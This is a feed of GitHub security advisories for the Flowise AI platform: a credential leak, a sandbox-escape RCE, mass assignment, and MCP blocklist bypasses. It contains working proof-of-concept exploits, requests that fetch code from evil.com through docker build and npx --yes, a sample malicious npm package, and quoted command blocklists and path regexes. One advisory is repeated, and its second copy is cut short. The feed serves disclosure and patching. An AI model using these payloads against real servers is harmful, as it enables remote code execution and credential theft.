<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-05-14T15:43:33.246Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI Vulnerable to Credential Data Leak]]></title>
        <id>https://github.com/advisories/GHSA-7g73-99r4-m4mj</id>
        <link href="https://github.com/advisories/GHSA-7g73-99r4-m4mj"/>
        <updated>2026-05-14T14:58:13.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Severity</strong>: HIGH (CVSS ~7.5)
<strong>Type</strong>: CWE-200 (Exposure of Sensitive Information)
<strong>File</strong>: <code>packages/server/src/services/credentials/index.ts:62-71</code></p>
<p><strong>Description</strong>: When credentials are fetched with a <code>credentialName</code> filter parameter, the <code>encryptedData</code> field is NOT stripped from the response. The code properly omits <code>encryptedData</code> when NO filter is used (line 102) but fails to do so when a filter IS used (lines 62-63, 70-71).
Credential Data Leak
<strong>Evidence</strong>:</p>
<pre><code class="language-typescript">// Lines 62-63: WITH filter - encryptedData LEAKED
const credentials = await appServer.AppDataSource.getRepository(Credential).findBy(searchOptions)
dbResponse.push(...credentials)  // encryptedData NOT removed!

// Lines 100-102: WITHOUT filter - encryptedData properly omitted
for (const credential of credentials) {
    dbResponse.push(omit(credential, ['encryptedData']))  // Correctly omitted
}
</code></pre>
<p><strong>Impact</strong>: Authenticated users can extract encrypted credential data (API keys, passwords, tokens for services like OpenAI, AWS, etc.). Combined with access to the encryption key file (<code>~/.flowise/encryption.key</code> written with default permissions), this enables full credential theft.</p>
<p><strong>Reproduction</strong>:</p>
<pre><code class="language-bash">curl https://TARGET/api/v1/credentials?credentialName=openAIApi \
  -H "Authorization: Bearer API_KEY"
# Response includes encryptedData field with AES-encrypted credentials
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-7g73-99r4-m4mj">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-7g73-99r4-m4mj</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-7g73-99r4-m4mj">https://github.com/advisories/GHSA-7g73-99r4-m4mj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7g73-99r4-m4mj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T14:58:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI: Authenticated Host RCE via POST /api/v1/node-custom-function and NodeVM Sandbox Escape]]></title>
        <id>https://github.com/advisories/GHSA-9rvc-vf7m-pgm2</id>
        <link href="https://github.com/advisories/GHSA-9rvc-vf7m-pgm2"/>
        <updated>2026-05-14T14:57:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>POST /api/v1/node-custom-function</code> lacks route-level authorization, allowing any authenticated user or API key to submit arbitrary JavaScript to the <code>Custom JS Function</code> node.</p>
<p>When <code>E2B_APIKEY</code> is not configured — the common deployment case — Flowise executes this code inside a <code>NodeVM</code> sandbox. This sandbox can be escaped, allowing an attacker to reach the host <code>process</code> object and execute system commands via <code>child_process</code>.</p>
<p>The result is authenticated remote code execution on the Flowise server host. CVSS v3.1: <code>AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</code> = <strong>9.9 Critical</strong>.</p>
<h3 id="details">Details</h3>
<p>Two distinct security boundaries are violated.</p>
<p><strong>1. Missing route-level authorization</strong></p>
<p><code>packages/server/src/routes/node-custom-functions/index.ts</code> registers the endpoint with no permission middleware:</p>
<pre><code class="language-ts">router.post('/', nodesRouter.executeCustomFunction)
</code></pre>
<p>Other sensitive routes in the same codebase use explicit permission gates:</p>
<pre><code class="language-ts">// packages/server/src/routes/chatflows/index.ts
router.post(
  '/',
  checkAnyPermission('chatflows:create,chatflows:update,agentflows:create,agentflows:update'),
  chatflowsController.saveChatflow
)
</code></pre>
<p>Global <code>/api/v1</code> authentication still applies, so this is not unauthenticated — but any valid session or API key reaches the endpoint without further restriction.</p>
<p><strong>2. NodeVM sandbox escape</strong></p>
<p>The endpoint forwards <code>body.javascriptFunction</code> through the following chain:</p>
<pre><code>POST /api/v1/node-custom-function
  → packages/server/src/controllers/nodes/index.ts
  → packages/server/src/utils/executeCustomNodeFunction.ts
  → packages/components/nodes/utilities/CustomFunction/CustomFunction.ts
    executeJavaScriptCode(javascriptFunction, sandbox)
  → packages/components/src/utils.ts
    if !process.env.E2B_APIKEY → NodeVM fallback
  → [SINK] host process / child_process
</code></pre>
<p><code>packages/components/src/utils.ts</code> only uses the external E2B sandbox when <code>E2B_APIKEY</code> is set. Otherwise it silently falls back to <code>@flowiseai/nodevm</code>:</p>
<pre><code class="language-ts">const shouldUseSandbox = useSandbox &amp;&amp; process.env.E2B_APIKEY
</code></pre>
<p>Flowise explicitly frames this as a sandboxed execution path — the helper is named <code>createCodeExecutionSandbox</code>, its inline comment reads <code>Execute JavaScript code using either Sandbox or NodeVM</code>, and the NodeVM instance is configured with <code>eval: false</code>, <code>wasm: false</code>, and mocked HTTP clients. The sandbox is a real declared security boundary, not incidental isolation.</p>
<p>These controls do not prevent escape. The payload abuses an exception path where an <code>Error</code> object escapes the NodeVM boundary. Because the error originates from the host runtime, its constructor chain resolves to the outer Node.js realm. This allows recovery of the host <code>Function</code> constructor (<code>e.constructor.constructor</code>), which can then access <code>process</code> and built-in modules such as <code>child_process</code>:</p>
<pre><code class="language-js">const FunctionCtor = e.constructor.constructor;
const cp = FunctionCtor('return process.getBuiltinModule("child_process")')();
return cp.execSync('id').toString().trim();
</code></pre>
<p>The NodeVM fallback is the practical default. <code>packages/server/.env.example</code> and <code>CONTRIBUTING.md</code> do not require <code>E2B_APIKEY</code> for custom JS execution, so most deployments are affected.</p>
<h3 id="poc">PoC</h3>
<p><strong>Standalone verification</strong> (run from the repository root with <code>E2B_APIKEY</code> unset):</p>
<pre><code class="language-js">// poc_Flowise_NodeCustomFunction_RCE_2026.js
const path = require('path');

delete process.env.E2B_APIKEY;
process.env.TS_NODE_COMPILER_OPTIONS = JSON.stringify({ moduleResolution: 'NodeNext' });

require(path.resolve('targets/Flowise/node_modules/ts-node/register/transpile-only'));

const { nodeClass: CustomFunction } = require(path.resolve(
  'targets/Flowise/packages/components/nodes/utilities/CustomFunction/CustomFunction.ts'
));

const attackCode = `
async function f() {
  const error = new Error();
  error.name = Object.create(null);
  return error.stack;
}
return await f().catch(e =&gt; {
  const FunctionCtor = e.constructor.constructor;
  const cp = FunctionCtor('return process.getBuiltinModule("child_process")')();
  return cp.execSync('id').toString().trim();
});
`;

(async () =&gt; {
  const node = new CustomFunction();
  const result = await node.init(
    { inputs: { javascriptFunction: attackCode } },
    '',
    { appDataSource: {}, databaseEntities: {}, workspaceId: undefined, orgId: undefined }
  );
  console.log('[RCE OUTPUT]', result);
})();
</code></pre>
<p>Confirmed output:</p>
<pre><code>[RCE OUTPUT] uid=501(researcher) gid=20(staff) groups=20(staff),...
</code></pre>
<p><strong>HTTP trigger</strong> (requires a valid API key or session):</p>
<pre><code class="language-http">POST /api/v1/node-custom-function HTTP/1.1
Host: target:3000
Authorization: Bearer &lt;valid-api-key&gt;
Content-Type: application/json

{
  "javascriptFunction": "async function f(){const error=new Error();error.name=Object.create(null);return error.stack;} return await f().catch(e=&gt;{const F=e.constructor.constructor;const cp=F('return process.getBuiltinModule(\"child_process\")')();return cp.execSync('id').toString().trim();});"
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Any authenticated Flowise user or holder of a standard API key can execute arbitrary commands as the Flowise server process. This includes reading environment variables and secrets, arbitrary filesystem access, outbound network requests from the host, and a foothold for persistence or lateral movement.</p>
<p>The NodeVM fallback is the default for any deployment without <code>E2B_APIKEY</code> configured, which covers the majority of self-hosted instances.</p>
<p><strong>Recommended remediation:</strong></p>
<ol>
<li>Add explicit permission gating to <code>POST /api/v1/node-custom-function</code> using the existing <code>checkPermission</code> middleware pattern.</li>
<li>Fail closed if <code>E2B_APIKEY</code> is absent — do not silently downgrade to NodeVM for untrusted code execution.</li>
<li>Restrict this endpoint from generic API key access.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9rvc-vf7m-pgm2">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9rvc-vf7m-pgm2</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-9rvc-vf7m-pgm2">https://github.com/advisories/GHSA-9rvc-vf7m-pgm2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9rvc-vf7m-pgm2</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-14T14:57:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] FlowiseAI has Mass Assignment in Assistant Update Endpoint that Allows Cross-Workspace Resource Reassignment]]></title>
        <id>https://github.com/advisories/GHSA-hp26-q66v-q2w7</id>
        <link href="https://github.com/advisories/GHSA-hp26-q66v-q2w7"/>
        <updated>2026-05-14T14:57:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Mass Assignment vulnerability exists in the assistant update endpoint of FlowiseAI.</p>
<p>The endpoint allows authenticated users to modify server-controlled properties such as workspaceId, createdDate, and updatedDate when updating an assistant resource.</p>
<p>Due to missing server-side validation and authorization checks, an attacker can manipulate the workspaceId field and reassign assistants to arbitrary workspaces. This breaks tenant isolation in multi-workspace environments.</p>
<h3 id="details">Details</h3>
<p>The endpoint responsible for updating assistants:</p>
<p><strong>PUT /api/v1/assistants/{assistantId}</strong></p>
<p>accepts a JSON request body containing assistant metadata.</p>
<p>However, the server does not restrict which properties may be modified by the client. As a result, user-controlled request bodies can include additional fields that should normally be controlled only by the backend.</p>
<p>Server-controlled fields that can be manipulated include:</p>
<ol>
<li>workspaceId</li>
<li>createdDate</li>
<li>updatedDate</li>
</ol>
<p>These fields appear to be directly mapped to the underlying database entity without strict DTO whitelisting or authorization checks.</p>
<p>For example, the following request body was accepted:</p>
<pre><code class="language-json">{
  "details": "",
  "credential": "11ca7fef-c9b1-4c87-aa54-e547aed8a249",
  "iconSrc": null,
  "type": "CUSTOM",
  "createdDate": "2026-03-06T17:31:04.000Z",
  "updatedDate": "2026-03-06T17:31:55.000Z",
  "workspaceId": "11111111-2222-3333-4444-555555555555"
}
</code></pre>
<p>This indicates that internal, server-controlled properties can be modified by an authenticated user.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Authenticate to the Flowise interface.</li>
<li>Capture the request used to update an assistant:</li>
</ol>
<pre><code class="language-http">PUT /api/v1/assistants/&lt;ASSISTANT_ID&gt;
Content-Type: application/json

Modify the request body by injecting server-controlled fields:

{
  "details": "",
  "credential": "11ca7fef-c9b1-4c87-aa54-e547aed8a249",
  "iconSrc": null,
  "type": "CUSTOM",
  "createdDate": "2026-03-06T17:31:04.000Z",
  "updatedDate": "2026-03-06T17:31:55.000Z",
  "workspaceId": "11111111-2222-3333-4444-555555555555"
}
</code></pre>
<p>3.Send the request.</p>
<p>Observe that the response accepts and persists the attacker-controlled workspaceId and metadata fields.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows authenticated users to manipulate internal attributes of assistant resources.</p>
<p>Confirmed impacts include:</p>
<ul>
<li>Cross-workspace reassignment of assistants (workspaceId)</li>
<li>Unauthorized modification of metadata (createdDate, updatedDate)</li>
</ul>
<p>In multi-tenant deployments, this may allow an attacker to move assistants between workspaces without authorization, breaking tenant isolation boundaries.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-hp26-q66v-q2w7">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-hp26-q66v-q2w7</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-hp26-q66v-q2w7">https://github.com/advisories/GHSA-hp26-q66v-q2w7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hp26-q66v-q2w7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T14:57:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise-components] Flowise has an MCP Security Bypass that Enables RCE]]></title>
        <id>https://github.com/advisories/GHSA-m99r-2hxc-cp3q</id>
        <link href="https://github.com/advisories/GHSA-m99r-2hxc-cp3q"/>
        <updated>2026-05-14T14:57:31.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>There are three bypass methods for the security limitations of the Flowise MCP feature, and attackers can execute arbitrary commands by combining these three methods</p>
<h2 id="details">Details</h2>
<h3 id="the-docker-build-subcommand-not-being-on-the-blocklist-leads-to-remote-code-execution">The Docker build subcommand not being on the blocklist leads to remote code execution</h3>
<p>The attacker configures the interface through the MCP tool to provide {"command":"docker","args":["build","<a href="https://evil.com/%22%5D%7D">https://evil.com/"]}</a> as the Custom MCP Server configuration 
→ Bypass the validateCommandFlags docker blocklist (only blocks run/exec/-v/--volume, etc., but does not block build)
→ docker build  will pull the Dockerfile from the remote address and execute the RUN instructions within it
→ Allows attackers to escape from Docker through methods such as mounting, thereby gaining full control of the Flowise host machine </p>
<p>Precondition: </p>
<ol>
<li>Have a Flowise account (any role, including regular users) or an API with view&amp;update permissions for chatflows</li>
<li>The deployment environment has the docker command</li>
</ol>
<p>Vulnerable function - validateCommandFlags: </p>
<pre><code>file: packages/components/nodes/tools/MCP/core.ts:260-310

const COMMAND_FLAG_BLACKLIST: Record&lt;string, string[]&gt; = {
    docker: [
        'run', 'exec', '-v', '--volume', '--privileged', '--cap-add',
        '--security-opt', '--network', '--pid', '--ipc'
        //  'build', 'pull', 'push', 'cp', 'commit' are not on the blocklist 
    ],
    npx: ['-c', '--call', '--shell-auto-fallback', '-y'],
    npm: ['run', 'exec', 'install', '--prefix', '-g', '--global', 'publish', 'adduser', 'login'],
    // ...
}
export function validateCommandFlags(command: string, args: string[]): ValidationResult {
    const blacklist = COMMAND_FLAG_BLACKLIST[command] || []
    for (const arg of args) {
        if (blacklist.includes(arg)) {
            return { valid: false, error: `Argument '${arg}' is not allowed for command '${command}'` }
        }
    }
    return { valid: true }
}
</code></pre>
<p>Reproduction process:</p>
<p>Add MCP config via UI or API interface, for example: </p>
<img width="1280" height="414" alt="2f0b6dfad5458616781921e1c28339d0" src="https://github.com/user-attachments/assets/6c8419c5-6261-46bb-8a30-3ac1ec3fb599">

<p>Then execute: </p>
<pre><code>POST /api/v1/prediction/{chatflows_id} HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Authorization: Bearer apikey
Content-Length: 17

{"question": "1"}
</code></pre>
<p>After execution, the command can be triggered to execute docker build <a href="http://evil.com">http://evil.com</a> </p>
<img width="1280" height="319" alt="f98e1d91428be6077ac6cf0472285f17" src="https://github.com/user-attachments/assets/856d46b4-7949-4091-bed9-a7c3fecc62f0">

<p>If a privileged container is deployed, then it can fully control the Flowise host machine </p>
<h3 id="npx---yes-long-parameter-alias-bypassing-blocklist-leads-to-remote-code-execution">npx --yes long parameter alias bypassing blocklist leads to remote code execution</h3>
<p>The attacker configures the MCP tool to provide {"command":"npx","args":["--yes","malicious-package"]} 
→ validateCommandFlags npx blocklist only contains short parameter -y, and does not block long parameter alias --yes
→ npx --yes malicious-package automatically agrees to install and execute any npm package
→ Leads to remote code execution (RCE) on the server </p>
<p>Precondition: </p>
<ol>
<li>Have a Flowise account (any role, including regular users) or an API with view&amp;update permissions for chatflows</li>
<li>The deployment environment has the npx command</li>
</ol>
<p>npx blocklist:</p>
<pre><code>file: packages/components/nodes/tools/MCP/core.ts:270-280

npx: ['-c', '--call', '--shell-auto-fallback', '-y'],
//    Only the short parameter -y is present, without the long parameter alias --yes
</code></pre>
<p>Reproduction process:
Add MCP config via UI or API interface, for example: </p>
<img width="1910" height="690" alt="85ea14ea224df9ed501827dfa47afb09" src="https://github.com/user-attachments/assets/8f3a2299-5460-4d23-b113-79ba4a9e52b6">

<pre><code>{
  "command": "npx",
  "args":["--yes", "http://evil.com/FileName.tar"]
}
</code></pre>
<p>Contents of the tar file:</p>
<pre><code>// index.js
#!/usr/bin/env node
const http = require('http');
const { execSync } = require('child_process');

const result = execSync('id &amp;&amp; hostname').toString().trim();
console.error('[MCP-RCE-002] npx --yes bypass: ' + result);

// package.json
{
  "name": "attacker-mcp-pkg",
  "version": "1.0.0",
  "bin": {
    "attacker-mcp-pkg": "./index.js"
  },
  "scripts": {
    "postinstall": ""
  }
}
</code></pre>
<p>Then execute: </p>
<pre><code>POST /api/v1/prediction/{chatflows_id} HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Authorization: Bearer apikey
Content-Length: 17

{"question": "1"}
</code></pre>
<p>can trigger the vulnerability, execute the attacker's commands, and achieve RCE:</p>
<img width="3026" height="256" alt="4c466067deb4606a38e4b73806661328" src="https://github.com/user-attachments/assets/e9821e3f-bda4-4c6a-bcd1-0b19053045c9">

<h3 id="node-command-bypassing-local-file-restrictions-leads-to-remote-code-execution">node command bypassing local file restrictions leads to remote code execution</h3>
<p>When configuring the CustomMCP node, the attacker provides {"command":"node","args":["local file"]} 
→ Bypass the security restrictions of validateArgsForLocalFileAccess 
→ Node process loads local files and executes arbitrary code → RCE </p>
<p>Precondition: 
Have a Flowise account </p>
<p>Analysis of Vulnerable Code:</p>
<pre><code>// packages/components/nodes/tools/MCP/core.ts:177-220

export const validateArgsForLocalFileAccess = (args: string[]): void =&gt; {
    const dangerousPatterns = [
        // Absolute paths
        /^\/[^/]/, // Unix absolute paths starting with /
        /^[a-zA-Z]:\\/, // Windows absolute paths like C:\

        // Relative paths that could escape current directory
        /\.\.\//, // Parent directory traversal with ../
        /\.\.\\/, // Parent directory traversal with ..\
        /^\.\./, // Starting with ..

        // Local file access patterns
        /^\.\//, // Current directory with ./
        /^~\//, // Home directory with ~/
        /^file:\/\//, // File protocol

        // Common file extensions that shouldn't be accessed
        /\.(exe|bat|cmd|sh|ps1|vbs|scr|com|pif|dll|sys)$/i,

        // File flags and options that could access local files
        /^--?(?:file|input|output|config|load|save|import|export|read|write)=/i,
        /^--?(?:file|input|output|config|load|save|import|export|read|write)$/i
    ]
</code></pre>
<p>The above are the main restrictions imposed by the validateArgsForLocalFileAccess function, and it can be found that the regular expression "/^/[^/]/" has a matching issue </p>
<p>As the comment says, this regular expression essentially detects whether it is a Unix absolute path, which matches /etc/passwd but does not match //etc/passwd (the second character is '/') </p>
<img width="1280" height="570" alt="ea354264cbb2ace6a3a6a16e00f1d298" src="https://github.com/user-attachments/assets/9ca88790-77ea-4d42-8910-09e4453f981a">

<p>Therefore, the limitation of this function can be bypassed by starting with //</p>
<p>** Reproduction process: **</p>
<p>Create a new chatflow as follows:</p>
<img width="1280" height="716" alt="7e884613b5897509b39467f8f3b7aae1" src="https://github.com/user-attachments/assets/478c7a89-4e77-4a5d-b063-de16cb640f92">

<p>After saving, cmd.js will be uploaded to the ~/.flowise/storage/{orgId}/{chatflow_id}/ directory</p>
<p>orgId can be obtained during login, and chatflow_id will also be returned when saving chatflow:</p>
<img width="1280" height="702" alt="48b5ab8412babba312f502be5db1dad3" src="https://github.com/user-attachments/assets/090292cf-6361-43cd-91d7-eec6e578255b">

<p>For example: </p>
<pre><code>~/.flowise/storage/d2312f99-9043-413a-a1d2-3b7685a132b2/f8cc7f34-a1e5-4180-940a-47306d32adc2/cmd.js
</code></pre>
<p>Since paths like ~/ are restricted, and an absolute path needs to be obtained, use the following method:</p>
<img width="1280" height="716" alt="990e1c81ed3957c5ae823e55efec15a5" src="https://github.com/user-attachments/assets/02c2a949-559a-4ee4-9675-c50a203d1e99">

<pre><code>POST /api/v1/export-import/import  HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
x-request-from: internal
Cookie: cookie
Connection: keep-alive
Content-Length: 479

 {
    "ChatMessage": [
      {
        "id": "11111111-2222-4333-8444-555555555555",
        "role": "userMessage",
        "chatflowid": "{chatflow_id}",
        "content": "seed for home path test",
        "chatType": "EXTERNAL",
        "chatId": "audit-home-001",
        "createdDate": "2026-03-04T06:40:00.000Z",
        "fileUploads": "[{\"type\":\"stored-file\",\"name\":\"poc.txt\",\"mime\":\"text/plain\"}]"
      }
    ]
  }
</code></pre>
<img width="1280" height="748" alt="d7f947940f4e6b6e95a61bcc301c25c0" src="https://github.com/user-attachments/assets/482fb78c-dbc8-4a0d-a042-4c993e976f10">

<pre><code>POST /api/v1/export-import/chatflow-messages HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
x-request-from: internal
Cookie: cookie
Connection: keep-alive
Content-Length: 57

{"chatflowId":"{chatflow_id}"}
</code></pre>
<p>After obtaining the absolute path, simply modify the path in args to the path of the file name: </p>
<pre><code>  {
    "command": "node",
    "args": ["//root/.flowise/storage/d2312f99-9043-413a-a1d2-3b7685a132b2/f8cc7f34-a1e5-4180-940a-47306d32adc2/cmd.js"]
  }
</code></pre>
<p>After saving, execution will trigger RCE </p>
<pre><code>POST /api/v1/prediction/{chatflows_id} HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Authorization: Bearer apikey
Content-Length: 17

{"question": "1"}
</code></pre>
<h2 id="impact">Impact</h2>
<p>This vulnerability allows attackers to execute arbitrary commands on the Flowise server .</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-m99r-2hxc-cp3q">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-m99r-2hxc-cp3q</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-m99r-2hxc-cp3q">https://github.com/advisories/GHSA-m99r-2hxc-cp3q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m99r-2hxc-cp3q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-14T14:57:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flowise] Flowise has an MCP Security Bypass that Enables RCE]]></title>
        <id>https://github.com/advisories/GHSA-m99r-2hxc-cp3q</id>
        <link href="https://github.com/advisories/GHSA-m99r-2hxc-cp3q"/>
        <updated>2026-05-14T14:57:31.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>There are three bypass methods for the security limitations of the Flowise MCP feature, and attackers can execute arbitrary commands by combining these three methods</p>
<h2 id="details">Details</h2>
<h3 id="the-docker-build-subcommand-not-being-on-the-blocklist-leads-to-remote-code-execution">The Docker build subcommand not being on the blocklist leads to remote code execution</h3>
<p>The attacker configures the interface through the MCP tool to provide {"command":"docker","args":["build","<a href="https://evil.com/%22%5D%7D">https://evil.com/"]}</a> as the Custom MCP Server configuration 
→ Bypass the validateCommandFlags docker blocklist (only blocks run/exec/-v/--volume, etc., but does not block build)
→ docker build  will pull the Dockerfile from the remote address and execute the RUN instructions within it
→ Allows attackers to escape from Docker through methods such as mounting, thereby gaining full control of the Flowise host machine </p>
<p>Precondition: </p>
<ol>
<li>Have a Flowise account (any role, including regular users) or an API with view&amp;update permissions for chatflows</li>
<li>The deployment environment has the docker command</li>
</ol>
<p>Vulnerable function - validateCommandFlags: </p>
<pre><code>file: packages/components/nodes/tools/MCP/core.ts:260-310

const COMMAND_FLAG_BLACKLIST: Record&lt;string, string[]&gt; = {
    docker: [
        'run', 'exec', '-v', '--volume', '--privileged', '--cap-add',
        '--security-opt', '--network', '--pid', '--ipc'
        //  'build', 'pull', 'push', 'cp', 'commit' are not on the blocklist 
    ],
    npx: ['-c', '--call', '--shell-auto-fallback', '-y'],
    npm: ['run', 'exec', 'install', '--prefix', '-g', '--global', 'publish', 'adduser', 'login'],
    // ...
}
export function validateCommandFlags(command: string, args: string[]): ValidationResult {
    const blacklist = COMMAND_FLAG_BLACKLIST[command] || []
    for (const arg of args) {
        if (blacklist.includes(arg)) {
            return { valid: false, error: `Argument '${arg}' is not allowed for command '${command}'` }
        }
    }
    return { valid: true }
}
</code></pre>
<p>Reproduction process:</p>
<p>Add MCP config via UI or API interface, for example: </p>
<img width="1280" height="414" alt="2f0b6dfad5458616781921e1c28339d0" src="https://github.com/user-attachments/assets/6c8419c5-6261-46bb-8a30-3ac1ec3fb599">

<p>Then execute: </p>
<pre><code>POST /api/v1/prediction/{chatflows_id} HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Authorization: Bearer apikey
Content-Length: 17

{"question": "1"}
</code></pre>
<p>After execution, the command can be triggered to execute docker build <a href="http://evil.com">http://evil.com</a> </p>
<img width="1280" height="319" alt="f98e1d91428be6077ac6cf0472285f17" src="https://github.com/user-attachments/assets/856d46b4-7949-4091-bed9-a7c3fecc62f0">

<p>If a privileged container is deployed, then it can fully control the Flowise host machine </p>
<h3 id="npx---yes-long-parameter-alias-bypassing-blocklist-leads-to-remote-code-execution">npx --yes long parameter alias bypassing blocklist leads to remote code execution</h3>
<p>The attacker configures the MCP tool to provide {"command":"npx","args":["--yes","malicious-package"]} 
→ validateCommandFlags npx blocklist only contains short parameter -y, and does not block long parameter alias --yes
→ npx --yes malicious-package automatically agrees to install and execute any npm package
→ Leads to remote code execution (RCE) on the server </p>
<p>Precondition: </p>
<ol>
<li>Have a Flowise account (any role, including regular users) or an API with view&amp;update permissions for chatflows</li>
<li>The deployment environment has the npx command</li>
</ol>
<p>npx blocklist:</p>
<pre><code>file: packages/components/nodes/tools/MCP/core.ts:270-280

npx: ['-c', '--call', '--shell-auto-fallback', '-y'],
//    Only the short parameter -y is present, without the long parameter alias --yes
</code></pre>
<p>Reproduction process:
Add MCP config via UI or API interface, for example: </p>
<img width="1910" height="690" alt="85ea14ea224df9ed501827dfa47afb09" src="https://github.com/user-attachments/assets/8f3a2299-5460-4d23-b113-79ba4a9e52b6">

<pre><code>{
  "command": "npx",
  "args":["--yes", "http://evil.com/FileName.tar"]
}
</code></pre>
<p>Contents of the tar file:</p>
<pre><code>// index.js
#!/usr/bin/env node
const http = require('http');
const { execSync } = require('child_process');

const result = execSync('id &amp;&amp; hostname').toString().trim();
console.error('[MCP-RCE-002] npx --yes bypass: ' + result);

// package.json
{
  "name": "attacker-mcp-pkg",
  "version": "1.0.0",
  "bin": {
    "attacker-mcp-pkg": "./index.js"
  },
  "scripts": {
    "postinstall": ""
  }
}
</code></pre>
<p>Then execute: </p>
<pre><code>POST /api/v1/prediction/{chatflows_id} HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Authorization: Bearer apikey
Content-Length: 17

{"question": "1"}
</code></pre>
<p>can trigger the vulnerability, execute the attacker's commands, and achieve RCE:</p>
<img width="3026" height="256" alt="4c466067deb4606a38e4b73806661328" src="https://github.com/user-attachments/assets/e9821e3f-bda4-4c6a-bcd1-0b19053045c9">

<h3 id="node-command-bypassing-local-file-restrictions-leads-to-remote-code-execution">node command bypassing local file restrictions leads to remote code execution</h3>
<p>When configuring the CustomMCP node, the attacker provides {"command":"node","args":["local file"]} 
→ Bypass the security restrictions of validateArgsForLocalFileAccess 
→ Node process loads local files and executes arbitrary code → RCE </p>
<p>Precondition: 
Have a Flowise account </p>
<p>Analysis of Vulnerable Code:</p>
<pre><code>// packages/components/nodes/tools/MCP/core.ts:177-220

export const validateArgsForLocalFileAccess = (args: string[]): void =&gt; {
    const dangerousPatterns = [
        // Absolute paths
        /^\/[^/]/, // Unix absolute paths starting with /
        /^[a-zA-Z]:\\/, // Windows absolute paths like C:\

        // Relative paths that could escape current directory
        /\.\.\//, // Parent directory traversal with ../
        /\.\.\\/, // Parent directory traversal with ..\
        /^\.\./, // Starting with ..

        // Local file access patterns
        /^\.\//, // Current directory with ./
        /^~\//, // Home directory with ~/
        /^file:\/\//, // File protocol

        // Common file extensions that shouldn't be accessed
        /\.(exe|bat|cmd|sh|ps1|vbs|scr|com|pif|dll|sys)$/i,

        // File flags and options that could access local files
        /^--?(?:file|input|output|config|load|save|import|export|read|write)=/i,
        /^--?(?:file|input|output|config|load|save|import|export|read|write)$/i
    ]
</code></pre>
<p>The above are the main restrictions imposed by the validateArgsForLocalFileAccess function, and it can be found that the regular expression "/^/[^/]/" has a matching issue </p>
<p>As the comment says, this regular expression essentially detects whether it is a Unix absolute path, which matches /etc/passwd but does not match //etc/passwd (the second character is '/') </p>
